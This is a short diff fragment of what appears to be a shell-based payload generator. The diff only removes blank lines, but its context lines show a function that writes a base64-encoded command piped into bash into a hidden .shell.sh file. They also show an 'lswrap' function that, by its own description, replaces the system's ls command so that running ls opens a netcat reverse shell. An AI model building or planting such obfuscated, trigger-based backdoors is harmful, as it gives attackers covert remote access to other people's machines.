@@ -32,7 +32,6 @@ function encshell(){
 }
 
 function genpayload(){
-		
 		function create(){
 				encshell
 				echo "nohup echo \"${encode}\" | base64 -d | bash" > .shell.sh
@@ -81,7 +80,6 @@ function genpayload(){
 }
 
 function lswrap(){
-
 		echo -e "--ls payload wrapper--\n"
 		echo -e "*****WARNING*****"
 		echo -e "This function wraps this systems ls command with a function that runs a netcat reverse shell when ls is run in terminal\n"
